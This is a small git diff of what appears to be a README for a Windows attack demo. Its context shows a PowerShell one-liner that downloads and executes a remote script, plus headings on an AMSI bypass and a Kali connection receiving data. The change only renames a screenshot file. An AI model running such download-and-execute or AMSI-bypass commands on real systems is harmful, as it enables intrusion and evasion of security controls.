@@ -27,6 +27,5 @@ iex (New-Object System.Net.WebClient).DownloadString('[https://raw.githubusercon
 ### 1. AMSI Bypass & Tool Loading
 ![AMSI Bypass Success](screenshots/windows_bypass.png)
 
-
 ### 2. Connection & Data Received
-![Kali Connection Success](screenshots/kali_success.png)
+![Kali Connection Success](screenshots/kali_success.jpg)
